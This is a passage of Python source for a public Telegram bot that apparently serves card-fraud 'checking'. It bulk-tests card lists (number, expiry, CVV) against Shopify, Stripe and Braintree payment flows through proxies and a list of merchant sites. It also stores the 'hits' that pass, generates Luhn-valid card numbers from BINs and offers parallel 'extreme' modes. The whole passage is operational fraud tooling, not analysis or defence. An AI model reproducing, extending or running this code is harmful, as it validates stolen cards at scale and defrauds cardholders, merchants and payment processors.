    """Comando /bin - Consultar info de un BIN sin hacer check"""
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Format: /bin 424242")
        return
    
    bin_number = args[1].strip()[:6]
    if not bin_number.isdigit() or len(bin_number) < 6:
        bot.reply_to(message, "❌ Invalid BIN. Must be 6 digits. Example: /bin 424242")
        return
    
    processing_msg = bot.reply_to(message, "🔍 *Looking up BIN info...*", parse_mode='Markdown')
    
    bin_info = bin_lookup(bin_number)
    
    if bin_info:
        level_line = f"\n   ├ {stylize_text('Level')}: {bin_info.get('level')}" if bin_info.get('level') else ""
        response = f"""{get_bot_header('shopify')}

🏦 *BIN LOOKUP*
{LINE_DOT}
💳 {stylize_text('BIN')}  ➜  `{bin_number}`

📋 *{stylize_text('Details')}*
   ├ {stylize_text('Brand')}: {bin_info.get('brand', 'Unknown')}
   ├ {stylize_text('Type')}: {bin_info.get('type', 'Unknown')}{level_line}
   ├ {stylize_text('Bank')}: {bin_info.get('bank', 'Unknown')}
   └ {stylize_text('Country')}: {bin_info.get('country', 'Unknown')}
{get_bot_footer()}"""
    else:
        response = f"""❌ *BIN NOT FOUND*
{LINE_THIN}
🏦 BIN `{bin_number}` not found in database.
💡 Try another BIN number."""
    
    try:
        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
    except:
        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)

@bot.message_handler(commands=['mode'])
def mode_command(message):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🐢 SAFE ─ 1 card at a time", callback_data="mode_seguro"),
        InlineKeyboardButton("⚡ FAST ─ 3 cards parallel", callback_data="mode_rapido"),
        InlineKeyboardButton("🚀 EXTREME ─ 5 cards parallel", callback_data="mode_extremo")
    )
    current_mode_text = {
        "seguro": "🐢 SAFE",
        "rapido": "⚡ FAST",
        "extremo": "🚀 EXTREME"
    }
    bot.reply_to(message, f"""🎮 *{BOT_NAME} ─ MODE SELECT*
{LINE_DASH}

🔄 *Current:* {current_mode_text.get(current_mode, 'FAST')} ({PARALLEL_WORKERS}x)

🔽 *Select parallel mode:*""", 
                 parse_mode='Markdown', reply_markup=markup)

# ============================================
# CALLBACKS
# ============================================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    global current_max_workers, mass_check_running, stripe_mass_running, sc_mass_running, b3_mass_running, stop_mass_flag, current_mode, PARALLEL_WORKERS, last_dead_proxies, mass_paused
    
    if call.data == "check":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "📝 /chk cc|mm|yy|cvv")
    
    elif call.data == "mass":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "/mass")
    
    elif call.data == "stripe_check":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "🔓 /au cc|mm|yy|cvv")
    
    elif call.data == "stripe_mass":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "/mau")
    
    elif call.data == "sc_check":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "💳 /sc cc|mm|yy|cvv")
    
    elif call.data == "sc_mass":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "/msc")
    
    elif call.data == "sc_hits":
        bot.answer_callback_query(call.id)
        sc_hits_command(call.message)
    
    elif call.data == "b3_check":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "🔐 /b3 cc|mm|yy|cvv")
    
    elif call.data == "b3_mass":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "/mb3")
    
    elif call.data == "b3_hits":
        bot.answer_callback_query(call.id)
        b3_hits_command(call.message)
    
    elif call.data == "stats":
        bot.answer_callback_query(call.id)
        show_stats(call.message)
    
    elif call.data == "hits":
        bot.answer_callback_query(call.id)
        hits_command(call.message)
    
    elif call.data == "stripe_hits":
        bot.answer_callback_query(call.id)
        stripe_hits_command(call.message)
    
    elif call.data == "sites":
        bot.answer_callback_query(call.id)
        list_sites_command(call.message)
    
    elif call.data == "proxies":
        bot.answer_callback_query(call.id)
        proxies = load_proxies()
        if not proxies:
            bot.send_message(call.message.chat.id, "❌ No proxies saved")
            return
        response = f"📡 *{BOT_NAME} ─ PROXIES ({len(proxies)})*\n{LINE_DASH}\n\n"
        for i, proxy in enumerate(proxies[:30], 1):
            parts = proxy.split(':')
            masked = f"{parts[0]}:{parts[1]}"
            if len(parts) >= 4:
                masked += ":****:****"
            response += f"  {i}. `{masked}`\n"
        response += f"\n{LINE_THIN}\n💡 Use `/delproxy <number>` to delete a proxy"
        safe_send_message(call.message.chat.id, response, parse_mode='Markdown')
    
    elif call.data == "px":
        bot.answer_callback_query(call.id)
        proxy_check_command(call.message)
    
    elif call.data == "bin_lookup":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "🏦 Send BIN number:\n/bin `424242`", parse_mode='Markdown')
    
    elif call.data == "gen_cards":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, "🎲 Generate cards with Luhn:\n/gen `424242` `10`\n\nFormat: /gen BIN [amount]", parse_mode='Markdown')
    
    elif call.data.startswith("regen_"):
        parts = call.data.split("_", 2)
        if len(parts) == 3:
            bin_prefix = parts[1]
            count = int(parts[2])
            bot.answer_callback_query(call.id, "🔄 Regenerating...")
            cards = generate_cards_from_bin(bin_prefix, count)
            bin_info = bin_lookup(bin_prefix[:6])
            response = _format_gen_response(bin_prefix, count, cards, bin_info)
            regen_markup = InlineKeyboardMarkup()
            regen_markup.row(
                InlineKeyboardButton("🔄 Regenerate", callback_data=f"regen_{bin_prefix}_{count}"),
                InlineKeyboardButton("📋 Copy All", callback_data=f"gencopy_{bin_prefix}_{count}")
            )
            try:
                bot.edit_message_text(response, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='Markdown', reply_markup=regen_markup)
            except:
                pass
    
    elif call.data.startswith("gencopy_"):
        parts = call.data.split("_", 2)
        if len(parts) == 3:
            bin_prefix = parts[1]
            count = int(parts[2])
            bot.answer_callback_query(call.id, "📋 Generating plain text...")
            cards = generate_cards_from_bin(bin_prefix, count)
            plain_text = '\n'.join(cards)
            bot.send_message(call.message.chat.id, f"```\n{plain_text}\n```", parse_mode='Markdown')
    
    elif call.data == "export":
        bot.answer_callback_query(call.id)
        cards = get_all_cards()
        if not cards:
            bot.send_message(call.message.chat.id, "❌ No Shopify cards to export")
            return
        content = "\n".join(cards)
        file_data = BytesIO(content.encode('utf-8'))
        file_data.name = f"cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        bot.send_document(call.message.chat.id, file_data, caption=f"💳 {len(cards)} Shopify cards")
    
    elif call.data == "clear_menu":
        shopify_count = len(get_all_cards())
        stripe_count = len(get_all_stripe_cards())
        b3_count = len(get_all_b3_cards())
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(f"🛒 Delete Shopify Cards ({shopify_count})", callback_data="confirm_clear_shopify"),
            InlineKeyboardButton(f"🔓 Delete Stripe Auth Cards ({stripe_count})", callback_data="confirm_clear_stripe"),
            InlineKeyboardButton(f"🔐 Delete Braintree Auth Cards ({b3_count})", callback_data="confirm_clear_b3"),
            InlineKeyboardButton("↩️ Cancel", callback_data="cancel_clear")
        )
        try:
            bot.edit_message_text(f"""⚠️ *{BOT_NAME} ─ DELETE CARDS*
{LINE_DASH}

🛒 Shopify: *{shopify_count}* cards
🔓 Stripe Auth: *{stripe_count}* cards
🔐 Braintree Auth: *{b3_count}* cards

🔽 *Select which cards to delete:*""", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown', reply_markup=markup)
        except:
            pass
        bot.answer_callback_query(call.id)
    
    elif call.data == "confirm_clear_shopify":
        count = len(get_all_cards())
        clear_cards()
        bot.answer_callback_query(call.id, f"✅ {count} Shopify cards deleted")
        try:
            bot.edit_message_text(f"🗑️ *{count} Shopify cards deleted*\n{LINE_THIN}\n🛒 Shopify queue is now empty", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "confirm_clear_stripe":
        count = len(get_all_stripe_cards())
        clear_stripe_cards()
        bot.answer_callback_query(call.id, f"✅ {count} Stripe Auth cards deleted")
        try:
            bot.edit_message_text(f"🗑️ *{count} Stripe Auth cards deleted*\n{LINE_THIN}\n🔓 Stripe Auth queue is now empty", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "confirm_clear_b3":
        count = len(get_all_b3_cards())
        clear_b3_cards()
        bot.answer_callback_query(call.id, f"✅ {count} Braintree Auth cards deleted")
        try:
            bot.edit_message_text(f"🗑️ *{count} Braintree Auth cards deleted*\n{LINE_THIN}\n🔐 Braintree Auth queue is now empty", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "cancel_clear":
        bot.answer_callback_query(call.id, "Cancelled")
        try:
            bot.edit_message_text(f"↩️ *Operation cancelled*\n{LINE_THIN}\nNo cards were deleted", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "stop_mass":
        if mass_check_running or stripe_mass_running or sc_mass_running or b3_mass_running:
            stop_mass_flag = True
            bot.answer_callback_query(call.id, "🛑 Stopping mass check...")
            try:
                if current_mass_msg and current_mass_chat_id:
                    bot.edit_message_text(f"""🛑 *{BOT_NAME} {BOT_VERSION}*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏳ *STOPPING MASS CHECK...*

Please wait while workers finish...""",
                        chat_id=current_mass_chat_id, message_id=current_mass_msg.message_id,
                        parse_mode='Markdown')
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "No active mass check")
    
    elif call.data == "fix_sites":
        bot.answer_callback_query(call.id)
        old_count = len(load_sites())
        new_count = fix_all_sites()
        bot.send_message(call.message.chat.id, f"🔧 *Sites Repaired*\n{LINE_THIN}\n📊 Before: *{old_count}*\n📊 After: *{new_count}*", parse_mode='Markdown')
    
    elif call.data == "permanent_sites":
        bot.answer_callback_query(call.id)
        permanent = sqlite_backup.get_permanent_sites()
        if not permanent:
            bot.send_message(call.message.chat.id, "🔒 No permanent sites yet.")
            return
        response = f"🔒 *{BOT_NAME} ─ PERMANENT SITES ({len(permanent)})*\n{LINE_DASH}\n\n"
        for i, site in enumerate(permanent[:20], 1):
            response += f"  {i}. `{site['url']}`\n     └─ ✅ Success: *{site['success_count']}*\n"
        safe_send_message(call.message.chat.id, response, parse_mode='Markdown')
    
    elif call.data == "mode_menu":
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton("🐢 SAFE ─ 1 card at a time", callback_data="mode_seguro"),
            InlineKeyboardButton("⚡ FAST ─ 3 cards parallel", callback_data="mode_rapido"),
            InlineKeyboardButton("🚀 EXTREME ─ 5 cards parallel", callback_data="mode_extremo")
        )
        try:
            bot.edit_message_text(f"""🎮 *{BOT_NAME} ─ MODE SELECT*
{LINE_DASH}

🔄 *Current:* {current_mode} ({PARALLEL_WORKERS}x)

🔽 *Select parallel mode:*""", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown', reply_markup=markup)
        except:
            pass
        bot.answer_callback_query(call.id)
    
    elif call.data == "mode_seguro":
        current_mode = "seguro"
        PARALLEL_WORKERS = 1
        bot.answer_callback_query(call.id, "✅ SAFE mode activated")
        try:
            bot.edit_message_text(f"🐢 *SAFE mode activated*\n{LINE_THIN}\n⚙️ Parallel workers: *1x*", chat_id=call.message.chat.id, 
                                message_id=call.message.message_id, parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "mode_rapido":
        current_mode = "rapido"
        PARALLEL_WORKERS = 3
        bot.answer_callback_query(call.id, "✅ FAST mode activated")
        try:
            bot.edit_message_text(f"⚡ *FAST mode activated*\n{LINE_THIN}\n⚙️ Parallel workers: *3x*", chat_id=call.message.chat.id, 
                                message_id=call.message.message_id, parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "mode_extremo":
        current_mode = "extremo"
        PARALLEL_WORKERS = 5
        bot.answer_callback_query(call.id, "✅ EXTREME mode activated")
        try:
            bot.edit_message_text(f"🚀 *EXTREME mode activated*\n{LINE_THIN}\n⚙️ Parallel workers: *5x*", chat_id=call.message.chat.id, 
                                message_id=call.message.message_id, parse_mode='Markdown')
        except:
            pass
    
    elif call.data == "setworkers_menu":
        markup = InlineKeyboardMarkup(row_width=5)
        markup.add(
            InlineKeyboardButton("1️⃣", callback_data="set_workers_1"),
            InlineKeyboardButton("2️⃣", callback_data="set_workers_2"),
            InlineKeyboardButton("3️⃣", callback_data="set_workers_3"),
            InlineKeyboardButton("4️⃣", callback_data="set_workers_4"),
            InlineKeyboardButton("5️⃣", callback_data="set_workers_5")
        )
        try:
            bot.edit_message_text(f"""⚙️ *{BOT_NAME} ─ WORKERS*
{LINE_DASH}

👷 *Current:* {current_max_workers} workers

🔽 *Select workers count:*""", 
                                chat_id=call.message.chat.id, message_id=call.message.message_id,
                                parse_mode='Markdown', reply_markup=markup)
        except:
            pass
        bot.answer_callback_query(call.id)
    
    elif call.data.startswith("set_workers_"):
        try:
            new_workers = int(call.data.replace("set_workers_", ""))
            current_max_workers = new_workers
            bot.answer_callback_query(call.id, f"✅ Workers: {current_max_workers}")
            try:
                bot.edit_message_text(f"✅ *Workers updated to {current_max_workers}*\n{LINE_THIN}\n👷 Active workers: *{current_max_workers}*", 
                                    chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    parse_mode='Markdown')
            except:
                pass
        except:
            bot.answer_callback_query(call.id, "Error")
    
    elif call.data == "delete_dead_proxies":
        if last_dead_proxies:
            count = delete_dead_proxies(last_dead_proxies)
            remaining = len(load_proxies())
            bot.answer_callback_query(call.id, f"✅ {count} dead proxies deleted")
            try:
                bot.edit_message_text(f"🗑️ *{count} dead proxies deleted*\n{LINE_THIN}\n📡 Remaining proxies: *{remaining}*", 
                                    chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    parse_mode='Markdown')
            except:
                pass
            last_dead_proxies = []
        else:
            bot.answer_callback_query(call.id, "No dead proxies to delete")
    
    elif call.data.startswith("file_gw_"):
        global pending_file_cards
        bot.answer_callback_query(call.id)
        chat_id_str = str(call.message.chat.id)
        
        if chat_id_str not in pending_file_cards:
            try:
                bot.edit_message_text("❌ No pending cards. Please upload a file again.",
                                    chat_id=call.message.chat.id, message_id=call.message.message_id)
            except:
                pass
        else:
            gw_choice = call.data.replace("file_gw_", "")
            
            if gw_choice == "all":
                gateways = ["shopify", "stripe_auth", "stripe_charge", "braintree_auth"]
                gw_names = ["🛒 Shopify", "🔓 Stripe Auth", "💳 Stripe Charge $10", "🔐 Braintree Auth $0"]
            elif gw_choice == "shopify":
                gateways = ["shopify"]
                gw_names = ["🛒 Shopify"]
            elif gw_choice == "stripe_auth":
                gateways = ["stripe_auth"]
                gw_names = ["🔓 Stripe Auth"]
            elif gw_choice == "stripe_charge":
                gateways = ["stripe_charge"]
                gw_names = ["💳 Stripe Charge $10"]
            elif gw_choice == "braintree_auth":
                gateways = ["braintree_auth"]
                gw_names = ["🔐 Braintree Auth $0"]
            else:
                gateways = []
                gw_names = []
            
            total_results = []
            for gw in gateways:
                total_cards, added, dup = process_file_cards_to_gateway(chat_id_str, gw)
                total_results.append((gw, added, dup))
            
            if chat_id_str in pending_file_cards:
                del pending_file_cards[chat_id_str]
            
            response = f"""\n{LINE_DASH}\n📂 *CARDS LOADED*\n{LINE_DASH}\n"""
            
            for i, (gw, added, dup) in enumerate(total_results):
                gw_display = gw_names[i] if i < len(gw_names) else gw
                response += f"\n{gw_display}:\n   ├ ✅ Added: *{added}*\n   └ 🔄 Duplicates: *{dup}*\n"
            
            response += f"\n{LINE_THIN}\n📊 *Queues:*\n"
            response += f"   🛒 Shopify: *{len(get_all_cards())}*\n"
            response += f"   🔓 Stripe Auth: *{len(get_all_stripe_cards())}*\n"
            response += f"   💳 Stripe Charge $10: *{len(get_all_sc_cards())}*\n"
            response += f"   🔐 Braintree Auth $0: *{len(get_all_b3_cards())}*"
            
            markup = InlineKeyboardMarkup(row_width=1)
            if gw_choice == "shopify" or gw_choice == "all":
                if len(get_all_cards()) > 0:
                    markup.add(InlineKeyboardButton("🛒 START SHOPIFY MASS ▶️", callback_data="mass"))
            if gw_choice == "stripe_auth" or gw_choice == "all":
                if len(get_all_stripe_cards()) > 0:
                    markup.add(InlineKeyboardButton("🔓 START AU MASS ▶️", callback_data="stripe_mass"))
            if gw_choice == "stripe_charge" or gw_choice == "all":
                if len(get_all_sc_cards()) > 0:
                    markup.add(InlineKeyboardButton("💳 START SC MASS ▶️", callback_data="sc_mass"))
            if gw_choice == "braintree_auth" or gw_choice == "all":
                if len(get_all_b3_cards()) > 0:
                    markup.add(InlineKeyboardButton("🔐 START B3 MASS ▶️", callback_data="b3_mass"))
            
            try:
                bot.edit_message_text(response, chat_id=call.message.chat.id, message_id=call.message.message_id,
                                    parse_mode='Markdown', reply_markup=markup if markup.keyboard else None)
            except:
                try:
                    bot.edit_message_text(response.replace('*', ''), chat_id=call.message.chat.id, message_id=call.message.message_id,
                                        reply_markup=markup if markup.keyboard else None)
                except:
                    pass
    
    elif call.data == "help":
        help_text = f"""❓ *{BOT_NAME} {BOT_VERSION}*
{LINE_DASH}
📖 *COMMAND REFERENCE*

🛒 *━━ SHOPIFY GATEWAY ━━*
  /chk `cc|mm|yy|cvv` ─ Single check
  /mass ─ Mass check (pipeline)
  /clearshopify ─ Delete cards
  /hits ─ View hits

🔓 *━━ STRIPE AUTH (FREE) ━━*
  /au `cc|mm|yy|cvv` ─ Single check
  /mau ─ Mass check (pipeline)
  /clearau ─ Delete cards
  /auhits ─ View hits

💳 *━━ STRIPE CHARGE $10 ━━*
  /sc `cc|mm|yy|cvv` ─ Single check
  /msc ─ Mass check (pipeline)
  /clearsc ─ Delete cards
  /schits ─ View hits

🔐 *━━ BRAINTREE AUTH $0 ━━*
  /b3 `cc|mm|yy|cvv` ─ Single check
  /mb3 ─ Mass check (pipeline)
  /clearb3 ─ Delete cards
  /b3hits ─ View hits

🏦 *━━ UTILITIES ━━*
  /bin `424242` ─ BIN lookup
  /gen `424242` `10` ─ Generate cards (Luhn)
  /cardinfo `cc|mm|yy|cvv` ─ Validate card
  /px ─ Deep proxy check (3 levels)
  /addproxy `IP:PORT` ─ Add proxy
  /testsite `URL` ─ Test site status

🧹 *━━ MAINTENANCE ━━*
  /dedup ─ Remove duplicate cards
  /cleanexp ─ Remove expired cards
  /proxyinfo ─ Proxy dashboard
  /siteinfo ─ Site dashboard

⚙️ *━━ SETTINGS ━━*
  /stats ─ Statistics panel
  /mode ─ Parallel mode (1x/3x/5x)
  /stop ─ Stop active mass check
{LINE_THIN}
🤖 {BOT_NAME} {BOT_VERSION}"""
        try:
            bot.edit_message_text(help_text, chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode='Markdown')
        except:
            pass
        bot.answer_callback_query(call.id)
    
    else:
        bot.answer_callback_query(call.id)

# ============================================
# RAILWAY HEALTH CHECK SERVER
# ============================================
from http.server import HTTPServer, BaseHTTPRequestHandler

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")
    def log_message(self, format, *args):
        pass

def start_health_server():
    port = int(os.environ.get("PORT", 0))
    if port:
        server = HTTPServer(("0.0.0.0", port), HealthHandler)
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        print(f"  🏥 Health check server on port {port}")

# ============================================
# START BOT
# ============================================
if __name__ == "__main__":
    print("\n" + "═" * 60)
    print(f"  🤖 {BOT_NAME} {BOT_VERSION} + STRIPE AUTH + STRIPE CHARGE $10 + BRAINTREE AUTH")
    print(f"  🚀 PARALLEL PIPELINE MODE")
    print("═" * 60)
    print(f"  🌐 Public mode: ALL USERS")
    print(f"  📂 Data dir: {DATA_DIR}")
    print(f"  🛒 Shopify cards: {len(get_all_cards())}")
    print(f"  🔓 Stripe Auth cards: {len(get_all_stripe_cards())}")
    print(f"  💳 Stripe Charge $10 cards: {len(get_all_sc_cards())}")
    print(f"  🔐 Braintree Auth $0 cards: {len(get_all_b3_cards())}")
    print(f"  🌐 Sites: {len(load_sites())}")
    print(f"  📡 Proxies: {len(load_proxies())}")
    print(f"  🎮 Mode: {current_mode} ({PARALLEL_WORKERS}x)")
    print("─" * 60)
    print("  COMMANDS:")
    print("    /mass  ─ Shopify mass check")
    print("    /mau   ─ Stripe Auth mass check (FREE)")
    print("    /msc   ─ Stripe Charge $10 mass check")
    print("    /mb3   ─ Braintree Auth $0 mass check")
    print("    /px    ─ Check proxies")
    print("    /stats ─ Statistics")
    print("─" * 60)
    print("  🌐 BOT IS PUBLIC - All users can use")
    print("═" * 60 + "\n")
    
    start_health_server()
    start_silent_pc()
    
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=30)
        except Exception as e:
            time.sleep(5)
